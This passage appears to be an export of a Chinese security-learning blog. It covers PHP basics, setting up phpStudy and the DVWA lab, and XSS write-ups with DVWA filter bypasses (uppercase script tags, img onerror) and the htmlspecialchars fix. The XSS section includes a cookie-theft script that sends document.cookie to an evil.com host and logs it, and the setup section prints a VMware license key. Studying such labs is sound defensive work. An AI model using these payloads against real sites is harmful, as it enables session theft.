    <content type="text"><![CDATA[来自菜鸟PHP基础语法学习总结。 语法PHP 脚本在服务器上执行，然后将纯 HTML 结果发送回浏览器。 PHP 脚本以 &lt;?php 开始，以 ?&gt; 结束。 PHP 中的每个代码行都必须以分号结束。 两种在浏览器输出文本的基础指令：echo 和 print。 PHP 文件通常包含 HTML 标签和一些 PHP 脚本代码,PHP 脚本可以放在文档中的任何位置。 单行注释：//，多行注释：/**/变量变量以 $ 符号开始，变量名是区分大小写。12345&lt;?php$txt="Hello world!";$x=5;$y=10.5;?&gt; PHP 是一门弱类型语言。 PHP 变量作用域PHP 有四种不同的变量作用域：local、global、static、parameter。 在所有函数外部定义的变量，拥有全局作用域。除了函数外，全局变量可以被脚本中的任何部分访问，要在一个函数中访问一个全局变量，需要使用 global 关键字。 函数内部声明的变量是局部变量，仅能在函数内部访问。 注意： global 关键字用于函数内访问全局变量。12345678910111213&lt;?php$x=5;$y=10; function myTest()&#123; global $x,$y; $y=$x+$y;&#125; myTest();echo $y; // 输出 15?&gt; PHP 将所有全局变量存储在一个名为 $GLOBALS[index] 的数组中。 index 保存变量的名称。这个数组可以在函数内部访问，也可以直接用来更新全局变量。 Static 作用域 当一个函数完成时，它的所有局部变量通常都会被删除。然而有时候希望某个局部变量不要被删除,第一次声明变量时使用 static 关键字。 超级全局变量超级全局变量在一个脚本的全部作用域中都可用。 不需要特别说明，也可以在函数及类中使用。123456789$GLOBALS$_SERVER$_REQUEST$_POST$_GET$_FILES$_ENV$_COOKIE$_SESSION $GLOBALS$GLOBALS 是一个包含了全部变量的全局组合数组。变量的名字就是数组的键。12345678910&lt;?php $x = 75; $y = 25;function addition() &#123; $GLOBALS['z'] = $GLOBALS['x'] + $GLOBALS['y']; &#125;addition(); echo $z; ?&gt; $_SERVER$_SERVER 是一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组。这个数组中的项目由 Web 服务器创建。不能保证每个服务器都提供全部项目；服务器可能会忽略一些，或者提供一些没有在这里列举出来的项目。12345678910111213&lt;?php echo $_SERVER['PHP_SELF'];echo "&lt;br&gt;";echo $_SERVER['SERVER_NAME'];echo "&lt;br&gt;";echo $_SERVER['HTTP_HOST'];echo "&lt;br&gt;";echo $_SERVER['HTTP_REFERER'];echo "&lt;br&gt;";echo $_SERVER['HTTP_USER_AGENT'];echo "&lt;br&gt;";echo $_SERVER['SCRIPT_NAME'];?&gt; $_REQUEST$_REQUEST 用于收集HTML表单提交的数据。12345678910111213141516&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;form method="post" action="&lt;?php echo $_SERVER['PHP_SELF'];?&gt;"&gt;Name: &lt;input type="text" name="fname"&gt;&lt;input type="submit"&gt;&lt;/form&gt;&lt;?php $name = $_REQUEST['fname']; echo $name; ?&gt;&lt;/body&gt;&lt;/html&gt; $_POST$_POST 被广泛应用于收集表单数据，在HTML form标签的指定该属性：”method=”post”。123456789101112131415&lt;html&gt;&lt;body&gt;&lt;form method="post" action="&lt;?php echo $_SERVER['PHP_SELF'];?&gt;"&gt;Name: &lt;input type="text" name="fname"&gt;&lt;input type="submit"&gt;&lt;/form&gt;&lt;?php$name = $_POST['fname'];echo $name;?&gt;&lt;/body&gt;&lt;/html&gt; $_GET$_GET 同样被广泛应用于收集表单数据，在HTML form标签的指定该属性：”method=”get”。$_GET也可以收集URL中发送的数据。12345&lt;html&gt;&lt;body&gt;&lt;a href="test_get.php?subject=PHP&amp;web=runoob.com"&gt;Test $GET&lt;/a&gt;&lt;/body&gt;&lt;/html&gt; test_get.php123456789&lt;html&gt;&lt;body&gt;&lt;?phpecho "Study " . $_GET['subject'] . " at " . $_GET['web'];?&gt;&lt;/body&gt;&lt;/html&gt; 魔术变量PHP 向它运行的任何脚本提供了大量的预定义常量。不过很多常量都是由不同的扩展库定义的，只有在加载了这些扩展库时才会出现，或者动态加载后，或者在编译时已经包括进去了。 这些特殊的常量不区分大小写,随着它们在代码中的位置改变而改变。 __LINE__: 文件中的当前行号。 __FILE__: 文件的完整路径和文件名。如果用在被包含文件中，则返回被包含的文件名。 __DIR__: 文件所在的目录。如果用在被包括文件中，则返回被包括的文件所在的目录。等价于 dirname(FILE)。除非是根目录，否则目录中名不包括末尾的斜杠。 __FUNCTION__: 返回该函数被定义时的名字。（PHP 5 起区分大小写） __CLASS__: 返回该类被定义时的名字（PHP 5 起区分大小写） __TRAIT__: Trait 的名字 __METHOD__: 类的方法名，返回该方法被定义时的名字（区分大小写） __NAMESPACE__: 当前命名空间的名称（区分大小写） echo/print echo - 可以输出一个或多个字符串。字符串可以包含 HTML 标签。 print - 只允许输出一个字符串，返回值总为 1。字符串可以包含 HTML 标签。 两者在使用时都可以加括号或不加，echo/echo()，print/print()。 定界符EOF(heredoc)PHP 定界符 EOF 的作用就是按照原样，包括换行格式什么的，输出在其内部的字符串；定界符 EOF 中的任何特殊字符都不需要转义。 规则： 必须后接分号，否则编译通不过。 EOF 可以用任意其它字符代替，只需保证结束标识EOF与开始标识&lt;&lt;&lt;EOF一致。 结束标识必须顶格独自占一行(即必须从行首开始，前后不能衔接任何空白和字符)。 开始标识可以不带引号或带单双引号，不带引号与带双引号效果一致，解释内嵌的变量和转义符号，带单引号则不解释内嵌的变量和转义符号。 当内容需要内嵌引号（单引号或双引号）时，不需要加转义符，本身对单双引号转义。 位于开始标记和结束标记之间的变量可以被正常解析，但是函数则不可以。 123456789&lt;?php$name="runoob";$a= &lt;&lt;&lt;EOF "abc"$name "123"EOF;// 结束需要独立一行且前后不能空格echo $a;?&gt; 数据类型String（字符串）, Integer（整型）, Float（浮点型）, Boolean（布尔型）, Array（数组）, Object（对象）, NULL（空值）。 以下实例中创建了一个数组， 然后使用 PHP var_dump() 函数返回数组的数据类型和值：123456&lt;?php $cars=array("Volvo","BMW","Toyota");var_dump($cars);?&gt;//输出 array(3) &#123; [0]=&gt; string(5) "Volvo" [1]=&gt; string(3) "BMW" [2]=&gt; string(6) "Toyota" &#125; 对象在 PHP 中，对象必须声明。用class关键字声明类对象，类是包含属性和方法的数据结构。在类中定义数据类型，然后在实例化的对象中使用数据类型：123456789101112&lt;?phpclass Car&#123; var $color; function __construct($color="green") &#123; $this-&gt;color = $color; &#125; function what_color() &#123; return $this-&gt;color; &#125;&#125;?&gt; $this 代表实例化的对象，PHP_EOL 为换行符。 常量常量在定义后，默认是全局变量,可以在整个运行的脚本的任何地方使用（包括函数内部）。 使用define()函数设置常量：bool define ( string $name , mixed $value [, bool $case_insensitive = false ] ) name：必选参数，常量名称，即标志符。 value：必选参数，常量的值。 case_insensitive ：可选参数，如果设置为 TRUE，该常量则大小写不敏感。默认是大小写敏感的。 eg:12345&lt;?php// 不区分大小写的常量名define("GREETING", "欢迎访问 Runoob.com", true);echo greeting; // 输出 "欢迎访问 Runoob.com"?&gt; 字符串 并置运算符 . 用于把两个字符串值连接起来。 12345 &lt;?php$txt1="Hello world!";$txt2="What a nice day!";echo $txt1 . " " . $txt2;?&gt; strlen() 函数返回字符串的长度（字符数)。 strpos() 函数用于在字符串内查找一个字符或一段指定的文本。如果在字符串中找到匹配，该函数会返回第一个匹配的字符位置。如果未找到匹配，则返回 FALSE。1234&lt;?php echo strpos("Hello world!","world"); ?&gt;//输出 6 数组创建数组array() 函数用于创建数组：array();有三种类型的数组： 数值数组 - 带有数字 ID 键的数组。$cars=array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;); 关联数组 - 带有指定的键的数组，每个键关联一个值。 使用分配给数组的指定键创建的数组。$age=array(&quot;Peter&quot;=&gt;&quot;35&quot;,&quot;Ben&quot;=&gt;&quot;37&quot;,&quot;Joe&quot;=&gt;&quot;43&quot;); 多维数组 - 包含一个或多个数组的数组 操作数组的方法 count() 函数用于返回数组的长度 访问数组元素，使用中括号 []，即$cars[0] 使用 foreach 循环遍历关联数组123456789101112&lt;?php$age=array("Peter"=&gt;"35","Ben"=&gt;"37","Joe"=&gt;"43");foreach($age as $x=&gt;$x_value)&#123; echo "Key=" . $x . ", Value=" . $x_value; echo "&lt;br&gt;";&#125;?&gt; //输出//Key=Peter, Value=35//Key=Ben, Value=37//Key=Joe, Value=43 数组排序123456sort() - 对数组进行升序排列rsort() - 对数组进行降序排列asort() - 根据关联数组的值，对数组进行升序排列ksort() - 根据关联数组的键，对数组进行升序排列arsort() - 根据关联数组的值，对数组进行降序排列krsort() - 根据关联数组的键，对数组进行降序排列 命名空间默认情况下，所有常量、类和函数名都放在全局空间下。如果一个文件中包含命名空间，它必须在其它所有代码之前声明命名空间，命名空间通过关键字namespace 来声明。 12345&lt;?php // 定义代码在 'MyProject' 命名空间中 namespace MyProject; // ... 代码 ... 注意： 在声明命名空间之前唯一合法的代码是用于定义源文件编码方式的 declare 语句。所有非 PHP 代码包括空白符都不能出现在命名空间的声明之前。 将全局的非命名空间中的代码与命名空间中的代码组合在一起，只能使用大括号形式的语法。全局代码必须用一个不带名称的 namespace 语句加上大括号括起来，例如：1234567891011121314&lt;?phpnamespace MyProject &#123;const CONNECT_OK = 1;class Connection &#123; /* ... */ &#125;function connect() &#123; /* ... */ &#125;&#125;namespace &#123; // 全局代码session_start();$a = MyProject\connect();echo MyProject\Connection::start();&#125;?&gt; 面向对象PHP 面向对象 表单验证表单下拉菜单多选下拉菜单是多选的（ multiple=”multiple”），可以通过将设置 select name=&quot;q[]&quot; 以数组的方式获取。123456789101112131415161718192021222324252627&lt;?php$q = isset($_POST['q'])? $_POST['q'] : '';if(is_array($q)) &#123; $sites = array( 'RUNOOB' =&gt; '菜鸟教程: http://www.runoob.com', 'GOOGLE' =&gt; 'Google 搜索: http://www.google.com', 'TAOBAO' =&gt; '淘宝: http://www.taobao.com', ); foreach($q as $val) &#123; // PHP_EOL 为常量，用于换行 echo $sites[$val] . PHP_EOL; &#125; &#125; else &#123;?&gt;&lt;form action="" method="post"&gt; &lt;select multiple="multiple" name="q[]"&gt; &lt;option value=""&gt;选择一个站点:&lt;/option&gt; &lt;option value="RUNOOB"&gt;Runoob&lt;/option&gt; &lt;option value="GOOGLE"&gt;Google&lt;/option&gt; &lt;option value="TAOBAO"&gt;Taobao&lt;/option&gt; &lt;/select&gt; &lt;input type="submit" value="提交"&gt; &lt;/form&gt;&lt;?php&#125;?&gt; 单选按钮单选按钮表单中 name 属性的值是一致的，value 值是不同的。1234567891011121314151617181920&lt;?php$q = isset($_GET['q'])? htmlspecialchars($_GET['q']) : '';if($q) &#123; if($q =='RUNOOB') &#123; echo '菜鸟教程&lt;br&gt;http://www.runoob.com'; &#125; else if($q =='GOOGLE') &#123; echo 'Google 搜索&lt;br&gt;http://www.google.com'; &#125; else if($q =='TAOBAO') &#123; echo '淘宝&lt;br&gt;http://www.taobao.com'; &#125;&#125; else &#123;?&gt;&lt;form action="" method="get"&gt; &lt;input type="radio" name="q" value="RUNOOB" /&gt;Runoob &lt;input type="radio" name="q" value="GOOGLE" /&gt;Google &lt;input type="radio" name="q" value="TAOBAO" /&gt;Taobao &lt;input type="submit" value="提交"&gt;&lt;/form&gt;&lt;?php&#125;?&gt; 复选框1234567891011121314151617181920212223&lt;?php$q = isset($_POST['q'])? $_POST['q'] : '';if(is_array($q)) &#123; $sites = array( 'RUNOOB' =&gt; '菜鸟教程: http://www.runoob.com', 'GOOGLE' =&gt; 'Google 搜索: http://www.google.com', 'TAOBAO' =&gt; '淘宝: http://www.taobao.com', ); foreach($q as $val) &#123; // PHP_EOL 为常量，用于换行 echo $sites[$val] . PHP_EOL; &#125; &#125; else &#123;?&gt;&lt;form action="" method="post"&gt; &lt;input type="checkbox" name="q[]" value="RUNOOB"&gt; Runoob&lt;br&gt; &lt;input type="checkbox" name="q[]" value="GOOGLE"&gt; Google&lt;br&gt; &lt;input type="checkbox" name="q[]" value="TAOBAO"&gt; Taobao&lt;br&gt; &lt;input type="submit" value="提交"&gt;&lt;/form&gt;&lt;?php&#125;?&gt; 表单验证应该尽可能的对用户的输入进行验证（通过客户端脚本），该验证仅用于对输入信息作合法性判断。浏览器验证速度更快，并且可以减轻服务器的压力。 如果用户输入需要插入数据库，应该考虑使用服务器验证，需要作安全性验证。 在服务器验证表单的一种好的方式是，把表单的数据传给当前页面（异步提交的方式更好），而不是跳转到不同的页面。这样用户就可以在同一张表单页面得到错误信息。用户也就更容易发现错误了。 表单验证一段html表单代码如下：123456789&lt;form method="post" action="&lt;?php echo htmlspecialchars($_SERVER["PHP_SELF"]);?&gt;"&gt;“名字”: &lt;input type="text" name="name"&gt;E-mail: &lt;input type="text" name="email"&gt;网址: &lt;input type="text" name="website"&gt;备注: &lt;textarea name="comment" rows="5" cols="40"&gt;&lt;/textarea&gt;性别:&lt;input type="radio" name="gender" value="female"&gt;女&lt;input type="radio" name="gender" value="male"&gt;男&lt;/form&gt; 该表单使用 method=”post” 方法来提交数据。 $_SERVER[&quot;PHP_SELF&quot;]是超级全局变量，返回当前正在执行脚本的文件名，与document root相关。 所以 $_SERVER[&quot;PHP_SELF&quot;] 会发送表单数据到当前页面，而不是跳转到不同的页面。 htmlspecialchars()方法：把一些预定义的字符转换为 HTML 实体。12345&amp; （和号） 成为 &amp;amp;&quot; （双引号） 成为 &amp;quot;&apos; （单引号） 成为 &amp;#039;&lt; （小于） 成为 &amp;lt;&gt; （大于） 成为 &amp;gt; $_SERVER[“PHP_SELF”]被用作XSS攻击当黑客使用跨网站脚本的HTTP链接来攻击时，$_SERVER[&quot;PHP_SELF&quot;]服务器变量也会被植入脚本。原因就是跨网站脚本是附在执行文件的路径后面的，因此$_SERVER[&quot;PHP_SELF&quot;]的字符串就会包含HTTP链接后面的JavaScript程序代码。 指定以下表单文件名为 “test_form.php”:1&lt;form method="post" action="&lt;?php echo $_SERVER["PHP_SELF"];?&gt;"&gt; 现在，使用URL来指定提交地址 “test_form.php”,以上代码修改为如下所示:1&lt;form method="post" action="test_form.php"&gt; 但是，当用户在浏览器输入以下地址：http://www.runoob.com/test_form.php/%22%3E%3Cscript%3Ealert(&#39;hacked&#39;)%3C/script%3E以上的 URL 中，将被解析为如下代码并执行:1&lt;form method="post" action="test_form.php/"&gt;&lt;script&gt;alert('hacked')&lt;/script&gt; 代码中添加了 script 标签，并添加了alert命令。 当页面载入时会执行该Javascript代码（用户会看到弹出框）。 如何避免 $_SERVER[“PHP_SELF”] 被利用可以通过 htmlspecialchars() 函数来避免被利用，如下：1&lt;form method="post" action="&lt;?php echo htmlspecialchars($_SERVER["PHP_SELF"]);?&gt;"&gt; htmlspecialchars() 把一些预定义的字符转换为 HTML 实体。现在如果用户想利用 PHP_SELF 变量, 结果将输出如下所示：1&lt;form method="post" action="test_form.php/&amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert('hacked')&amp;lt;/script&amp;gt;"&gt;]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[phpstudy与DVWA安装与配置，WAMP等相关概念学习]]></title>
    <url>%2F2018%2F05%2F17%2Fphpstudy%E4%B8%8EDVWA%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[帆哥教我玩WEB安全系列之最最开始环境配置篇。 VMware虚拟机安装现在最新版本的是 VMware workstation 14，怕激活密钥不好找，就安装了VMware workstation 12 pro(激活密钥：5A02H-AU243-TZJ49-GTC7K-3C61N)。 选择一个安装目录即可双击安装程序，傻瓜式安装VMware。然后装了win7 x64系统。 更改虚拟机的网络配置我的计算机-&gt; Windows 7 x64 -&gt; 右键单击 -&gt; 设置 -&gt; 网络适配器 -&gt; 网络连接，选择桥接模式。 桥接模式直接连接物理网络，相当于在主机系统和虚拟机系统之间连接了一个网桥，而网桥两端的网络都属于同一网络，主机和虚拟机是处于同一网络中的对等主机。 桥接模式通常用于利用VMWare在局域网内新建一个虚拟服务器，为局域网用户提供网络服务。 【博客VMware下网络配置三种模式对比（桥接模式，主机模式，网络地址转换）】 【待解决的问题:】讲道理采用桥接模式之后，虚拟机和宿主主机是处于同一局域网中的对等主机，是可以互相ping通的，不知是不是路由器防火墙的缘故，虚拟机(192.168.1.101)和宿主主机(192.168.1.124)之间ping不通，但可以通过宿主主机的浏览器访问虚拟主机(此时的虚拟主机相当于一个虚拟服务器)。宿主主机ping虚拟服务器：虚拟服务器ping宿主主机：浏览器访问虚拟服务器： phpStudy安装配置phpStudy是一个PHP调试环境的程序集成包，该程序包集成最新的Apache+PHP+MySQL+phpMyAdmin+ZendOptimizer,一次性安装，无须配置即可使用。可以用来模拟服务器环境，用于测试。 将phpStudy(2018版本)压缩包拖到虚拟机桌面，解压，安装即可。 更改网站目录默认运行一个.php程序必须要将该程序放在WWW文件夹下面。phpStudy下的web服务相关目录如下所示： web服务默认的运行目录是可以修改的: 其他选项菜单 -&gt; phpStudy设置 -&gt; 端口常规设置 如果更改了网站目录，要将之前WWW目录下的文件都拷过去。 更改默认首页还是在端口常规设置，默认首页选项中更改( localhost 访问的的时候出现的页面即为首页)。 更改端口号还是在端口常规设置，默认端口是 80 端口，如果更改为其他端口号，localhost访问时需要带上端口号(localhost:端口号/xx.html)，否则可以省略(localhost/xx.html)。 其他phpStudy的功能和用法参考博客【phpstudy使用说明教程】。 DVWA将DVWA(Damn Vulnerable Web Application)的压缩包拖进虚拟机，解压后丢到网站目录下： DVWA是一款基于php和mysql编写的用于常规WEB漏洞教学和检测的web脆弱性测试web应用。其中包含了SQL注入，盲注，文件包含，XSS，CSRF等一些常见的WEB漏洞，对进行Web渗透有较强的指导教学意义。 配置(1) 首先进入设置页面，注意： 在phpStudy虚拟web服务器环境下安装DVWA时出现的问题如以下界面中红色字体提示部分：解决方法参考博客 DVWA安装出现的问题（phpStudy）其中在解决PHP function allow_url_include：Disabled问题，修改完php.ini配置文件后记得重启phpStudy服务，不然还是显示错误提示。 注意： 由于使用了phpStudy，以下(2)中的配置可以忽略(步骤（2）是用于自己配置数据库的相关操作)，phpStudy已经为我们配置好了相关端口和数据库。phpStudy默认的数据库设置如下： 1234$_DVWA[ 'db_server' ] = '127.0.0.1';$_DVWA[ 'db_database' ] = 'dvwa';$_DVWA[ 'db_user' ] = 'root';$_DVWA[ 'db_password' ] = 'root'; 所以直接在setup页面点击Create Database按钮，初始化DVWA即可，就会跳转到login页面，WEB后台的账号是admin，密码password。 登录DVWA之后，通过DVWA Security设置项设置安全级别。 (2) 在设置页面，对DVWA需要的数据库进行创建和初始化。此时还没建立相关用户和数据库，那么接下来通过cmd建立数据库和用户： 连接数据库。mysql -u root -p是连接数据库服务器的命令，-u表示用户名(root),-p表示密码，即在连接数据库之前要求输入用户名和密码|（MySQL用户名和密码默认都是root）。 win+r-&gt;打开cmd命令行，输入用户名和密码，哦豁，又出错了： 解决办法参考博客 命令行中输入：mysql -u root -p 提示没有这个命令，即将mysql的安装路径添加到系统环境变量中。 此时进入mysql创建数据库 dvwa，然后创建新用户dvwa，并设置密码123456。 123mysql&gt; create database dvwa;mysql&gt; insert into mysql.user(Host,User,Password) values("localhost",'dvwa',password('123456'));mysql&gt; flush privileges; 其中flush privileges本质上的作用是将当前user和privilige表中的用户信息/权限设置从mysql库(MySQL数据库的内置库)中提取到内存里。MySQL用户数据和权限有修改后，希望在”不重启MySQL服务”的情况下直接生效，那么就需要执行这个命令。通常是在修改ROOT帐号的设置后，怕重启后无法再登录进来，那么直接flush之后就可以看权限设置是否生效，而不必冒太大风险。 修改dvwa用户针对数据库dvwa的相关权限，授权dvwa用户拥有数据库dvwa的所有权限。格式：grant 权限 on 数据库.* to 用户名@登录主机 identified by &quot;密码&quot;。 12mysql&gt; grant all privileges on dvwa.* to dvwa@localhost identified by '123456';mysql&gt; flush privileges; 修改dvwa目录下的config/config.inc.php以下内容： 1234$_DVWA[ 'db_server' ] = '127.0.0.1';$_DVWA[ 'db_database' ] = 'dvwa';$_DVWA[ 'db_user' ] = 'dvwa';$_DVWA[ 'db_password' ] = '123456'; 然后在setup页面点击Create Database按钮，初始化DVWA。 以下是几个概念的补充学习。 WAMPWindows下的Apache+Mysql/MariaDB+Perl/PHP/Python，一组常用来搭建动态网站或者服务器的开源软件。本身都是各自独立的程序，但是因为常被放在一起使用，拥有了越来越高的兼容度，共同组成了一个强大的Web应用程序平台。 LAMP是基于Linux，Apache，MySQL/MariaDB，Perl/PHP/Python的开放资源网络开发平台。Linux是开放系统；Apache是最通用的网络服务器；mySQL是带有基于网络管理附加工具的关系数据库；PHP是流行的对象脚本语言。 一般说来，大家都习惯 于将Apache、MySQL、PHP架设在Linux系统下，开发者在Windows操作系统下使用这些Linux环境里的工具称为使用WAMP。 目前有不少AMP（Apache\MySQL\PHP）的集成软件，可以让我们一次安装并设置好，WAMP集成环境主要有： XAMPP（Apache+MySQL+PHP+PERL）XAMPP是一款具有中文说明的功能全面的集成环境，XAMPP并不仅仅针对Windows，而是一个适用于Linux、Windows、Mac OS X 和Solaris 的易于安装的Apache 发行版。软件包中包含Apache 服务器、MySQL、SQLite、PHP、Perl、FileZilla FTP Server、Tomcat等等。默认安装开放了所有功能，安全性有问题，需要进行额外的安全设定。 WampServerWampServe是集成了Apache、MySQL、PHP、phpmyadmin的web服务器，支持Apache的mod_rewrite，PHP扩展、Apache模块只需要在菜单“开启/关闭”上点点就搞定，省去了修改配置文件的麻烦，是windows下的 Apache Mysql PHP集成安装环境。 AppServ集成了Apache、PHP、MySQL、phpMyAdmin，较为轻量，版本很久未更新了。 phpStudy该程序包集成最新的Apache+Nginx+IIS+MySQL+phpMyAdmin，一次性安装，无须配置即可使用，是非常方便、好用的PHP调试环境。 web容器Java Servlet 可以理解为服务器端处理数据的java小程序，web容器则负责管理servlet等。 servlet没有main方法，那我们如何启动一个servlet，如何结束一个servlet，如何寻找一个servlet等等，都受控于另一个java应用，这个应用我们就称之为web容器。 一个典型的JavaEE系统可以由两部分构成首先是Web Server 用于处理静态资源，然后是JavaEE Application Server 用于处理业务的动态资源。而这两部分可以是单独的服务器例如Nginx+WebSphere也可以在一个服务器上完成比如Tomcat(Tomcat即可以处理静态资源又可以处理动态的Servlet)。 参考博客: web开发中 web 容器的作用（如tomcat） JavaEE中Web服务器、Web容器、Application服务器区别及联系]]></content>
      <categories>
        <category>Web Security</category>
      </categories>
      <tags>
        <tag>Web Security</tag>
        <tag>phpStudy</tag>
        <tag>DVWA</tag>
        <tag>WAMP</tag>
        <tag>Web容器</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[（二）Web安全深度剖析学习【XSS】]]></title>
    <url>%2F2018%2F05%2F17%2FWeb%E5%AE%89%E5%85%A8%E6%B7%B1%E5%BA%A6%E5%89%96%E6%9E%90%E5%AD%A6%E4%B9%A0-XSS%2F</url>
    <content type="text"><![CDATA[《Web安全深度剖析》学习总结, 本部分主要包括XSS原理及三种类型XSS攻击和预防。一篇较好的博客XSS跨站脚本攻击(一)—-XSS攻击的三种类型。 XSS跨站脚本漏洞XSS(Cross Site Scripting)，即跨站脚本攻击。指攻击者在网页中嵌入客户端脚本，通常是JS编写的恶意代码，当用户使用浏览器浏览被嵌入恶意代码的网页时，恶意代码将会在用户浏览器上执行。XSS属于客户端攻击。 XSS原理XSS攻击在网页中嵌入客户端恶意脚本代码，这些恶意脚本代码一般使用JavaScript编写，所以JS能做到什么效果，XSS的威力就有多大。JavaScript可以用来获取用户cookie，改变页面内容、url跳转，所以存在XSS漏洞的网站就可以盗取用户cookie、黑掉页面、导航到恶意网站。 如下，在formProcess_XSS目录下，创建index.html和index.php，添加如下代码：index.html123456789101112131415&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;meta http-equiv="X-UA-Compatible" content="ie=edge"&gt; &lt;title&gt;XSS form process&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;form action="index.php" method="POST"&gt; &lt;input type="text" name="username" /&gt; &lt;input type="submit" value="提交" /&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt; index.php12345&lt;?php //echo $_SERVER['PHP_SELF']; $user_name = $_POST["username"]; echo $user_name;?&gt; 然后将formProcess_XSS目录丢到phpStudy的WWW目录下，浏览器访问http://192.168.1.101/formProcess_XSS/index.html，其中192.168.1.101表示虚拟服务器的地址，当在文本输入框中输入&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;，然后点击提交，就会触发XSS攻击，因为index.php未对用户输入的内容作处理，没有将html的字符处理为html实体，如下： 攻击者可以在&lt;script&gt;和&lt;/script&gt;之间输入JavaScript代码，实现一定的攻击效果。在真实攻击中，攻击者不仅仅弹出一个框，通常使用&lt;script src=&quot;http://www.secbug.org/x.txt&quot;&gt;&lt;/script&gt;方式来加载外部脚本，而在x.txt中存放着攻击者的恶意JavaScript代码，这段代码可能是用来盗取用户的Cookie，也可能是监控键盘记录等恶意行为。 XSS类型XSS主要分为三类，反射型(经过后端，不经过数据库)、存储型(经过后端，经过数据库)、DOM型(不经过后端)。反射型 XSS 的数据流向是：浏览器 -&gt; 后端 -&gt; 浏览器。 存储型 XSS 的数据流向是：浏览器 -&gt; 后端 -&gt; 数据库 -&gt; 后端 -&gt; 浏览器。 DOM-XSS 的数据流向是：URL–&gt;浏览器 反射型XSS反射型XSS也被称为非持久性XSS。当用户访问一个带有XSS代码的URL请求时，服务器端接收数据后处理，然后把带有XSS代码的数据发送到浏览器，浏览器解析这段带有XSS代码的数据后，最终造成XSS漏洞。eg： index.php1234&lt;?php $user_name = $_GET["username"]; echo $user_name;?&gt; 在上述代码中，index.php接收username值后再输出，若提交index.php?username=HIM，则程序将输出HIM，若恶意用户输入index.php?username=&lt;script&gt;XSS恶意代码&lt;script/&gt;，将会造成反射型攻击。 有人会问，我怎么可能自己去把HIM改成可以执行的恶意代码呢?这不是自己坑自己吗，但是一种情况是别人可能修改HIM为恶意代码，然后将这个恶意的URL发送给你。反射型XSS盗取用户cookie的过程如下： 假设网站A存在XSS漏洞，发送可以触发该漏洞的特定代码到网站A上的目标用户HIM恶意链接构造如下：1&lt;a href = "http://www.foo.com/xss/xss.php?username=&lt;script src = http://www.evil.com/xss/hacker.js /&gt;凤姐最新性感视频&lt;/a&gt; 其中，www.foo.com/xss/xss.php?username= 是存在漏洞的网站A，执行盗取cookie操作的文件位于黑客的网站B，B网站主要有两个文件 hacker.js和 hacker.php。 hacker.js123var img = new Image();img.src = "http://www.evil.com/xss/hacker.php?username=" + document.cookie;document.body.append(img); hacker.php123456&lt;?php$cookie = $_GET['username'];var_dump($cookie);$myFile = "cookie.txt";file_put_contents($myFile, $cookie);?&gt; 当用户点击了(凤姐最新性感视频)链接后，被攻击目标HIM用户在网站A的cookie将被黑客拿到，存到网站B的cookie.txt文件中。 DVWA—XSS(Reflected)（1）LOWSOURCE:1234567&lt;?php// Is there any input?if( array_key_exists( "name", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Feedback for end user echo '&lt;pre&gt;Hello ' . $_GET[ 'name' ] . '&lt;/pre&gt;';&#125;?&gt; 漏洞源于，对于接受用户数据的name参数没有进行过滤直接在网页中输出。 攻击代码：&lt;script&gt;alert(document.cookie)&lt;/script&gt;效果: （2）MEDIUMSOURCE:12345678910&lt;?php// Is there any input?if( array_key_exists( "name", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Get input $name = str_replace( '&lt;script&gt;', '', $_GET[ 'name' ] ); // Feedback for end user echo "&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;";&#125;?&gt; 上述代码在输出name参数中的数据之前，先利用str_replace(find,replace,string,count))函数将&lt;script&gt;替换为空。 补充： Php中”{}”大括号的用法总结，上述代码echo &quot;&lt;pre&gt;Hello ${name}&lt;/pre&gt;&quot;中，${name}与$name或{$name}是一样的。 攻击代码1，可以使用大写的&lt;SCRIPT&gt;：&lt;SCRIPT&gt;alert(document.cookie)&lt;/SCRIPT&gt; 攻击代码2，通过HTML跨站：&lt;img src=1 onerror=alert(document.cookie)&gt;。onerror 事件会在文档或图像加载过程中发生错误时被触发，支持该事件的HTML标签，&lt;img&gt;, &lt;object&gt;, &lt;style&gt;。 （3）HIGHSOURCE:12345678910&lt;?php// Is there any input?if( array_key_exists( "name", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Get input $name = preg_replace( '/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] ); // Feedback for end user echo "&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;";&#125;?&gt; preg_replace() 函数执行一个正则表达式的搜索和替换。上述代码在输出name参数中的数据之前，先利用preg_replace()函数将含有&lt;script&gt;或替&lt;SCRIPT&gt;的部分替换为空。 攻击代码：通过HTML跨站：&lt;img src=1 onerror=alert(document.cookie)&gt;。 避免XSS反射型攻击利用htmlspecialchars()方法：把一些预定义的敏感字符转义为 HTML 实体。所有的跨站语句中基本都离不开这些符号，因而只需要这一个函数就阻止了XSS漏洞。 &amp; （和号） 成为 &amp;amp; &quot; （双引号） 成为 &amp;quot; &apos; （单引号） 成为 &amp;#039; &lt; （小于） 成为 &amp;lt; &gt; （大于） 成为 &amp;gt; 如下php代码，阻止了上述利用&lt;script&gt;和&lt;img&gt;进行的XSS反射型攻击：123456789&lt;?php// Is there any input?if( array_key_exists( "name", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) &#123; // Get input $name = htmlspecialchars($_GET[ 'name' ]); // Feedback for end user echo "Hello $&#123;name&#125;";&#125;?&gt; 当在文本输入框输入&lt;script&gt;alert(document.cookie)&lt;/script&gt;或&lt;img src=1 